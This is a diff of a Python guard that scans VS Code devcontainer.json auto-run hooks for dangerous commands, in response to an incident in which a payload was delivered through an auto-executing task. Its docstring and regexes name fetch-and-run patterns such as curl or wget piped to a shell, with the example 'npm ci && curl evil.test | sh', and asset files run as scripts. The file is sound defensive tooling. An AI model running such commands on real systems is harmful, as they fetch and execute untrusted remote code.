@@ -1,86 +1,119 @@
-"""Guard B-2 — VS Code Dev Container auto-run configuration.
+"""Guard C — VS Code Dev Container auto-run configuration.
 
-Detects dangerous *auto-execution* configuration in ``.devcontainer`` files, which
-are JSONC and whose ``postCreateCommand`` / ``postStartCommand`` /
-``postAttachCommand`` hooks run code automatically when a container is (re)started.
+Detects dangerous *auto-execution* configuration in ``.devcontainer`` files,
+which are JSONC and whose ``postCreateCommand`` / ``postStartCommand`` /
+``postAttachCommand`` hooks run code automatically when a container is
+(re)started. This is a known attack surface: the incident delivered a
+JavaScript payload via an auto-executing VS Code task; the same class of
+abuse exists for devcontainers.
 
 Scope (explicit, intentionally narrow):
   * files: ``.devcontainer/devcontainer.json``, ``.devcontainer.json``,
-    ``.devcontainer/<name>/devcontainer.json`` (first match wins; no recursion into
-    unrelated directories)
-  * signals checked:
-    - postCreateCommand / postStartCommand / postAttachCommand /
-      onCreateCommand / initializeCommand / updateContentCommand
-    - command bodies that pipe a network fetch to a shell
-      (``curl ... | sh``, ``wget -O- ... | bash``, ``Invoke-WebRequest … | iex``)
-    - command bodies that invoke a *binary/asset* path rather than a manifest
-      (``node ./public/fonts/x.woff2``, ``dist/setup.js``, arbitrary ``./path``)
-    - ``remoteUser`` / ``containerUser`` set to ``root`` *combined with* any exec hook
-      (root alone is not flagged)
-  * ALLOWED: plain package-manager / build commands invoked via manifest only
-    (``npm ci``, ``yarn install``, ``cargo build``, ``rustup component add``,
-    ``sudo apt-get update``). These are common legitimate devcontainer bootstrap lines
-    and must not create noise.
+    ``.devcontainer/<name>/devcontainer.json`` (no recursion into unrelated
+    directories)
+  * command value forms accepted by the devcontainer spec:
+    - string: a single shell command line
+    - array:  a list of shell command lines (joined with ``&&`` for scanning)
+    - object: an object with a ``"command"`` key
+  * signals checked across the *whole* command string (no prefix bypass):
+    - pipes a network fetch to a shell: ``curl ... | (sh|bash|pwsh|iex)``,
+      ``wget ... | (sh|bash)`` — including after an allow-listed prefix
+      (``npm ci && curl evil.test | sh`` is caught)
+    - executes a binary/asset path rather than a manifest: ``node
+      ./public/fonts/x.woff2``, ``node ./dist/setup.js``
+    - ``remoteUser`` / ``containerUser`` set to ``root`` *combined with* any
+      exec hook (root alone is not flagged)
 
-False-positive policy (documented, not suppressed silently):
-  * Any devcontainer.json is inspected; if *none* of the above hooks exist the file
-    passes. A devcontainer with only ``"build": {...}, "extensions": [...]` passes.
-  * If ``.devcontainer/`` does not exist at all, the guard prints
-    ``inspected 0 file(s)`` and exits 0 — this repo currently has no devcontainer,
-    so the guard is preventive only and its production effectiveness is verified
-    by fixtures, not by a live target.
+ALLOWED patterns (suppress noise only — they do NOT short-circuit danger
+checks; a command matching the allow-list is still scanned):
+  * npm ci / yarn install / pnpm install (with flags)
+  * cargo build / check / fmt / clippy / test (with flags)
+  * rustup component add
+  * apt-get update / install, apt update / install (incl. sudo)
+  * bun install, pip install, deno install
+
+False-positive policy (documented):
+  * A devcontainer with no auto-exec hook passes.
+  * Valid spec forms (string / array / object) are all understood.
+  * ``node ./scripts/x.js`` and other project scripts under ``scripts/``
+    are NOT flagged — only asset-like extensions and asset/seed dirs
+    (``public/fonts/``, ``dist/``, ``assets/``) are.
+  * If ``.devcontainer/`` does not exist, the guard prints
+    ``inspected 0 file(s)`` and exits 0 — this repo currently has no
+    devcontainer, so the guard is preventive only; its effectiveness is
+    verified by fixtures, not a live target.
 
 NOT claimed:
-  - Does NOT scan Dockerfile `RUN`/`ENTRYPOINT` inside the devcontainer image build
-    (out of scope; Dockerfile linting is a separate concern).
-  - Does NOT cover user-level VS Code *devcontainer* overrides, extensions that
-    inject tasks, or remote-SSH behavior.
+  - Does NOT scan Dockerfile ``RUN``/``ENTRYPOINT`` (separate concern).
+  - Does NOT cover user-level VS Code devcontainer overrides, extensions
+    that inject tasks, or remote-SSH behavior.
   - Does NOT execute or interpret the commands it inspects.
+  - Is NOT a general malware detector — it targets the specific
+    auto-execution patterns this incident used.
 """
+
 from __future__ import annotations
 
 import argparse
 import json
 import os
-import sys
 import re
+import sys
 from pathlib import Path
 
 
-# Commands that are ordinary, manifest-driven bootstrap — not suspicious on their own.
-# These are allow-listed so the guard does not flag common legitimate devcontainer
-# setup lines like "npm ci" or "cargo build".
+# Commands that are ordinary, manifest-driven bootstrap — not suspicious on
+# their own. Anchored with $ so an allow-listed tool must be the ENTIRE
+# command line; anything appended (&&, ;, newline, env assignment) falls
+# through to the danger checks below. NOTE: the allow-list does NOT
+# short-circuit danger checks — it only suppresses the "not in allow-list"
+# noise for known-good single commands.
 SAFE_BOOTSTRAP_PATTERNS: list[str] = [
-    r"^\s*npm\s+ci\b",
-    r"^\s*yarn\s+install\b",
-    r"^\s*pnpm\s+install\b",
-    r"^\s*cargo\s+build\b",
-    r"^\s*cargo\s+check\b",
-    r"^\s*cargo\s+fmt\b",
-    r"^\s*cargo\s+clippy\b",
-    r"^\s*cargo\s+test\b",
-    r"^\s*rustup\s+component\s+add\b",
-    r"^\s*sudo\s+apt-get\s+update\b",
-    r"^\s*sudo\s+apt-get\s+install\b",
-    r"^\s*sudo\s+apt\s+update\b",
-    r"^\s*sudo\s+apt\s+install\b",
+    r"^\s*npm\s+ci\s*$",
+    r"^\s*yarn\s+install\s*(?:--.*)?$",
+    r"^\s*pnpm\s+install\s*(?:--.*)?$",
+    r"^\s*cargo\s+build\s*(?:--.*)?$",
+    r"^\s*cargo\s+check\s*(?:--.*)?$",
+    r"^\s*cargo\s+fmt\s*(?:--.*)?$",
+    r"^\s*cargo\s+clippy\s*(?:--.*)?$",
+    r"^\s*cargo\s+test\s*(?:--.*)?$",
+    r"^\s*rustup\s+component\s+add\s+.+$",
+    r"^\s*sudo\s+apt-get\s+update\s*$",
+    r"^\s*sudo\s+apt-get\s+install\s+-y\s+.+$",
+    r"^\s*sudo\s+apt\s+update\s*$",
+    r"^\s*sudo\s+apt\s+install\s+-y\s+.+$",
+    r"^\s*apt-get\s+update\s*$",
+    r"^\s*apt-get\s+install\s+-y\s+.+$",
+    r"^\s*apt\s+update\s*$",
+    r"^\s*apt\s+install\s+-y\s+.+$",
+    r"^\s*bun\s+install\s*$",
+    r"^\s*pip\s+install\s+(?:-[^\s]+\s+)*.+$",
+    r"^\s*deno\s+install\s*$",
 ]
 _SAFE_BOOTSTRAP = re.compile("|".join(SAFE_BOOTSTRAP_PATTERNS), re.IGNORECASE)
 
-# Suspicious: fetch-and-exec from the network
+# Suspicious: network-fetch tool piped to a shell, ANYWHERE in the command
+# (including after allow-listed prefixes and inside command substitutions).
 FETCH_AND_RUN = re.compile(
-    r"curl\b.*\|\s*(sh|bash)|wget\b.*-O\?-.*\|\s*(sh|bash)|"
-    r"Invoke-WebRequest\b.*\|\s*iex|irm\b.*\|\s*iex",
+    r"(?:curl|wget|Invoke-WebRequest|irm)\b.*\|\s*(?:sh|bash|pwsh|iex)\b",
     re.IGNORECASE | re.DOTALL,
 )
 
-# Suspicious: run a binary/asset path that is clearly not a manifest tool
+# Suspicious: execute a binary/asset path rather than a manifest tool.
+# Narrowed so legitimate project scripts (node ./scripts/x.js) pass.
 RUNS_ASSET = re.compile(
-    r"\bnode\b\s+\S*\.(woff2?|ttf|otf|otf2|eot|js)\b|"
-    r"\bsh\s+\S*\.(woff2?|ttf|otf|eot|js)\b|"
-    r"\bbash\s+\S*\.(woff2?|ttf|otf|eot|js)\b|"
-    # any ./relative path that points at a non-manifest file
-    r"(?:\bsh\b|\bnode\b|\bbash\b)\s+\./(?!package\.json\b|Cargo\.toml\b)\S*\.\w{2,5}\b",
+    # interpreter + path with an asset-like extension, anywhere
+    r"(?<![\w./])(?:node|sh|bash|pwsh)\s+\S*\.(?:woff2?|ttf|otf|eot|llf)\b(?:\s|$|;|&|\|)",
+    re.IGNORECASE,
+)
+# interpreter + a .js under an asset/seed directory (the incident shape)
+RUNS_ASSET_SEED = re.compile(
+    r"(?<![\w./])(?:node|sh|bash|pwsh)\s+\S*(?:^|/)(?:dist|public/fonts|assets)/\S*\.js\b",
+    re.IGNORECASE,
+)
+# interpreter + ./path with .js that is NOT under scripts/ (project scripts)
+RUNS_ASSET_DOT_JS = re.compile(
+    r"(?<![\w./])(?:node|sh|bash|pwsh)\s+\./+(?!scripts/)\S*\.js\b",
     re.IGNORECASE,
 )
 
@@ -90,10 +123,10 @@ HOOK_KEYS = (
 )
 
 
-def _candidate_files():
-    """Return likely devcontainer.json paths relative to repo root, in priority order.
+def _candidate_files() -> list[str]:
+    """Return likely devcontainer.json paths relative to repo root.
 
-    Does NOT recurse: devcontainer.json lives at one of these known locations.
+    Does NOT recurse into arbitrary directories.
     """
     return [
         ".devcontainer/devcontainer.json",
@@ -180,10 +213,62 @@ def strip_jsonc(text: str) -> str:
     return "".join(cleaned)
 
 
+def _normalize_commands(val) -> list[str]:
+    """Extract command strings from a devcontainer hook value.
+
+    Accepts every form the devcontainer spec allows:
+      - str  -> returned as-is (one command)
+      - list -> each element is a separate command line (array form)
+      - dict -> dict["command"] (string or list) is used
+    Returns a list of normalized command strings (empty if no command).
+    """
+    if isinstance(val, str):
+        return [val]
+    if isinstance(val, list):
+        return [str(p) if not isinstance(p, str) else p for p in val]
+    if isinstance(val, dict):
+        cmd = val.get("command")
+        if cmd is None:
+            return []
+        if isinstance(cmd, str):
+            return [cmd]
+        if isinstance(cmd, list):
+            return [str(p) if not isinstance(p, str) else p for p in cmd]
+        return []
+    return []
+
+
 def _is_safe_bootstrap(cmd: str) -> bool:
-    if _SAFE_BOOTSTRAP.match(cmd):
-        return True
-    return False
+    """True only if the *entire* command matches an allow-listed pattern."""
+    return _SAFE_BOOTSTRAP.match(cmd) is not None
+
+
+def check_command(cmd: str, key: str, rel: str, errors: list[str]) -> None:
+    """Run all danger-pattern checks against a full command string.
+
+    The allow-list does NOT short-circuit — danger patterns are always
+    evaluated on the whole string, so 'npm ci && curl | sh' is caught.
+    """
+    cmd = cmd.strip()
+    if not cmd:
+        return
+
+    problems: list[str] = []
+    if FETCH_AND_RUN.search(cmd):
+        problems.append(f"pipes a network fetch to a shell ({cmd[:80]!r})")
+    if RUNS_ASSET.search(cmd):
+        problems.append(f"executes a binary/asset path ({cmd[:80]!r})")
+    if RUNS_ASSET_SEED.search(cmd):
+        problems.append(
+            f"executes a .js file from an asset/seed directory ({cmd[:80]!r})"
+        )
+    if RUNS_ASSET_DOT_JS.search(cmd):
+        problems.append(
+            f"executes a .js file outside scripts/ ({cmd[:80]!r})"
+        )
+
+    for p in problems:
+        errors.append(f"{rel}: {key} {p}")
 
 
 def check_devcontainer(path: str, errors: list[str], rel: str) -> None:
@@ -207,29 +292,19 @@ def check_devcontainer(path: str, errors: list[str], rel: str) -> None:
         val = data.get(key)
         if val is None:
             continue
-        if not isinstance(val, str):
-            errors.append(f"{rel}: {key} must be a string, got {type(val).__name__}")
+        if not isinstance(val, (str, list, dict)):
+            errors.append(
+                f"{rel}: {key} must be a string, array, or object, "
+                f"got {type(val).__name__}"
+            )
+            continue
+
+        cmds = _normalize_commands(val)
+        if not cmds:
             continue
         hooks_found.append(key)
-        cmd = val.strip()
-        if not cmd:
-            continue
-        if _is_safe_bootstrap(cmd):
-            continue
-        if FETCH_AND_RUN.search(cmd):
-            errors.append(
-                f"{rel}: {key} pipes a network fetch to a shell ({cmd.strip()[:80]!r})"
-            )
-            continue
-        if RUNS_ASSET.search(cmd):
-            errors.append(
-                f"{rel}: {key} executes a binary/asset path rather than a manifest ({cmd.strip()[:80]!r})"
-            )
-            continue
-        # otherwise: a non-listed, non-safe command — report for human review
-        errors.append(
-            f"{rel}: {key} uses a command not in the allow-list ({cmd.strip()[:80]!r})"
-        )
+        for cmd in cmds:
+            check_command(cmd, key, rel, errors)
 
     # root user only matters if combined with an exec hook
     user = data.get("remoteUser") or data.get("containerUser")
@@ -264,7 +339,6 @@ def main() -> int:
             if os.path.isfile(abs_p):
                 targets.append((abs_p, rel))
         for abs_p in _devcontainer_dirs(args.root):
-            # rel made pretty
             try:
                 rel = os.path.relpath(abs_p, args.root)
             except ValueError:
